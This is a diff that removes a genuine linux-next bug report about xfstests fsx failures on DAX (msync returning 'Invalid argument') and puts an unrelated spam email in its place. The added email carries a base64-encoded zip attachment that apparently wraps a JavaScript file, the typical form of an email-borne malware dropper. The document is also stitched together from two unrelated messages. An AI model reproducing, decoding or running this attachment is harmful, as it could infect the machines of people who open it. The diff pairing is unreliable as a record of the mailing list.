@@ -1,93 +1,103 @@
-From: Xiong Zhou <xzhou@redhat.com>
-Subject: fsx tests on DAX started to fail with msync failure on 0307 -next
- tree
-Date: Tue, 14 Mar 2017 10:56:42 +0800
-Message-ID: <20170314025642.nwpf7zxbc6655gum@XZHOUW.usersys.redhat.com>
+From: <muirs@stolaf.edu>
+Subject: 49106 linux-next
+Date: Tue, 14 Mar 2017 12:34:44 -0000
+Message-ID: <148949488490.15433.6348320432687970517@tsrv.ru>
+Reply-To: <muirs@stolaf.edu>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="92685.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-next-owner@vger.kernel.org>
-Received: from mx1.redhat.com ([209.132.183.28]:36686 "EHLO mx1.redhat.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1752012AbdCNC4o (ORCPT <rfc822;linux-next@vger.kernel.org>);
-        Mon, 13 Mar 2017 22:56:44 -0400
-Content-Disposition: inline
+Received: from mpool3-185.tsrv.ru ([83.221.3.185]:52497 "HELO tsrv.ru"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750771AbdCNMeu (ORCPT <rfc822;linux-next@vger.kernel.org>);
+        Tue, 14 Mar 2017 08:34:50 -0400
+Content-Disposition: attachment
 Sender: linux-next-owner@vger.kernel.org
 List-ID: <linux-next.vger.kernel.org>
-To: linux-nvdimm@ml01.01.org
-Cc: linux-fsdevel@vger.kernel.org, linux-next@vger.kernel.org, linux-kernel@vger.kernel.org, linux-mm@kvack.org
+To: linux-next <linux-next@vger.kernel.org>
 
-Hi,
-
-xfstests cases:
-generic/075 generic/112 generic/127 generic/231 generic/263
-
-fail with DAX, pass without it. Both xfs and ext4.
-
-It was okay on 0306 -next tree.
-
-+ ./check generic/075
-FSTYP         -- xfs (non-debug)
-PLATFORM      -- Linux/x86_64 hp-dl360g9-12 4.11.0-rc1-linux-next-5be4921-next-20170310
-MKFS_OPTIONS  -- -f -bsize=4096 /dev/pmem0p2
-MOUNT_OPTIONS -- -o dax -o context=system_u:object_r:nfs_t:s0 /dev/pmem0p2 /daxsch
-
-generic/075 4s ... [failed, exit status 1] - output mismatch (see /root/xfstests/results//generic/075.out.bad)
-    --- tests/generic/075.out	2016-12-13 14:38:25.984557426 +0800
-    +++ /root/xfstests/results//generic/075.out.bad	2017-03-14 10:40:23.083052839 +0800
-    @@ -4,15 +4,4 @@
-     -----------------------------------------------
-     fsx.0 : -d -N numops -S 0
-     -----------------------------------------------
-    -
-    ------------------------------------------------
-    -fsx.1 : -d -N numops -S 0 -x
-    ------------------------------------------------
-    ...
-    (Run 'diff -u tests/generic/075.out /root/xfstests/results//generic/075.out.bad'  to see the entire diff)
-..
-
-$ diff -u xfstests/tests/generic/075.out /root/xfstests/results//generic/075.out.bad
---- xfstests/tests/generic/075.out	2016-12-13 14:38:25.984557426 +0800
-+++ /root/xfstests/results//generic/075.out.bad	2017-03-14 10:40:23.083052839 +0800
-@@ -4,15 +4,4 @@
- -----------------------------------------------
- fsx.0 : -d -N numops -S 0
- -----------------------------------------------
--
-------------------------------------------------
--fsx.1 : -d -N numops -S 0 -x
-------------------------------------------------
--
-------------------------------------------------
--fsx.2 : -d -N numops -l filelen -S 0
-------------------------------------------------
--
-------------------------------------------------
--fsx.3 : -d -N numops -l filelen -S 0 -x
-------------------------------------------------
-+    fsx (-d -N 1000 -S 0) failed, 0 - compare /root/xfstests/results//generic/075.0.{good,bad,fsxlog}
-
-$ diff -u /root/xfstests/results//generic/075.0.{good,fsxlog} | tail -20
--03cb30 f903 da03 1103 7503 5403 8903 9f03 6b03
--03cb40 bb03 fb03 5603 7e03 c503 ca03 0103 9603
--03cb50 7f03 7c03 0c03 5103 ed03 dc03 a403 5c03
--03cb60 5403 b903 4403 3c03 4b03 a903 2303 1a03
--03cb70 2b03 5f03 fd03 ee03 1303 9703 2903 d303
--03cb80 4e03 9903 f903 8003 b803 2503 2203 c903
--03cb90 6803 7a03 0f03 6303 de03 ba03 6e03 6503
--03cba0 db03
--03cba2
-+skipping zero size read
-+skipping insert range behind EOF
-+3 mapwrite	0x2e836 thru	0x3cba1	(0xe36c bytes)
-+domapwrite: msync: Invalid argument
-+LOG DUMP (3 total operations):
-+1(  1 mod 256): SKIPPED (no operation)
-+2(  2 mod 256): SKIPPED (no operation)
-+3(  3 mod 256): MAPWRITE 0x2e836 thru 0x3cba1	(0xe36c bytes)
-+Log of operations saved to "075.0.fsxops"; replay with --replay-ops
-+Correct content saved for comparison
-+(maybe hexdump "075.0" vs "075.0.fsxgood")
-
-https://git.kernel.org/pub/scm/fs/xfs/xfstests-dev.git/tree/tests/generic/075
-https://git.kernel.org/pub/scm/fs/xfs/xfstests-dev.git/tree/ltp/fsx.c
+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
